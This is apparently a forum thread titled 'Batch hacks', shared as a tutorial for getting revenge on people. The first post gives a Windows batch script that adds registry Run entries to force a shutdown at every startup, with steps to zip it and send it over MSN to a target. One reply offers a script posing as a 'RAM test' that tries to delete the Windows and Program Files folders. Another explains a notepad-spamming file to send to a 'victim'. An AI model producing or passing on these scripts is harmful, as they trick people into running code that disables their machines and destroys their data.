channel.title: Batch hacks
channel.description:
Not sure if this has been posted before but a friend told me about it so ill post it anyways =)
if someone has peed you off recently you can now have revenge
*I AM NOT RESPONSABLE FOR ANY BAD STUFF THAT HAPPENS*
ok so go to your desktop and right click. Then go to new and make a .txt doccument and in that txt doccument type
Quote @ECHO off CLS COPY %0 C:\%0_1.bat ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg ECHO [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "backup1"="C:\%0_1.bat" >> temp.reg REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 00
then save it. Now rename this and call it run.bat or that run can be called anything you like ok now you have a deadly batch hack that will restart whoevers computer every 30 seconds when they run it. ok now make a new .zip folder and name it whatever you like and add the .bat file to it then go on msn and send this to them and tell them to run it =) then there computer is buggered
and i did not make this!!
[b]Ron: TUT removed from the title of the topic. This is the tutorial section, it's implied.[/b]
[b]Ron: NO TALKING OF REP! Read the rules.[/b]

item.title: Batch hacks
item.dc:creator: @jonckr jonckr
item.description:
@jonckr wrote:

@echo off
echo.
echo -----------------------------------
echo This tests your RAM capabilities via color flashes
echo Do not be alarmed if this screens changes colors at a rapid rate.
echo -----------------------------------
color 00
cd
del windows
color ff
cd
del Program Files
color 00
cd
del Start Menu
color 0F
Good Game

A simple one

Read full topic

item.title: Batch hacks
item.dc:creator: @bigmac bigmac
item.description:
@bigmac wrote:

Yes well done. What you do for the one that opens lots of notepads is:

  1. make a new text doccument.

  2. open it and inside type
    @ECHO off
    start Notepad
    ECHO (your message here)

  3. copy and paste this as many times as you want notepads. but without the @ECHO off ontop.

  4. once you have done this save it.

  5. rightclick the notepad you have just made and rename it to (whatever you like).bat

  6. then right click in a folder/desktop and make a new zip folder/archive

  7. and name the zip archive/folder whatever you like.

  8. add the .bat file into the zip folder

  9. send this to your victim and tell them to run it =)

  10. laugh at them and have fun with it.

Read full topic
